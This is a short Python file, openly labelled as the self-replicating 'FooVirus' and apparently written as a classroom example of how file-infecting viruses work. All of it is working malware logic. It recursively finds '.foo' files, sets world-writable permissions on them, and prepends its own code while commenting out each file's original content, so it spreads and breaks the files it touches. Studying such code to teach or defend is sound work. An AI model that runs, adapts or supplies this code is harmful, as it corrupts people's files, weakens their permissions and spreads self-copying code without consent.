'''
Code for self-replicating virus (FooVirus). 
'''

import sys
import os
import glob

print("Hello from FooVirus")

IN = open(sys.argv[0], "r") # sys.argv[0] refers to this file -> We are reading this code file
virus = [line for (i, line) in enumerate(IN) if i < 37]  # Storing first 37 line of code in virus
virus.append("\n")

for item in glob.glob("./**/*.foo", recursive=True):  # FOR every file with extension .foo in current directory
    IN = open(item, "r") # open file in read mode
    print("Opened", item)
    all_of_it = IN.readlines()
    IN.close()  # closing the file
    if any("foovirus" in line for line in all_of_it):
        continue  # if the word foovirus is written in any line then skip writing to the file
    os.chmod(item, 0o777)  # Read Write and Execute access to owner grouds and all others

    OUT = open(item, "w")  # Open File in write mode
    OUT.writelines(virus)  # Write the code lines to the file
    all_of_it = ["#" + line for line in all_of_it]  # put "#" in front of the content previously present in the file
    OUT.writelines(all_of_it)
    OUT.close()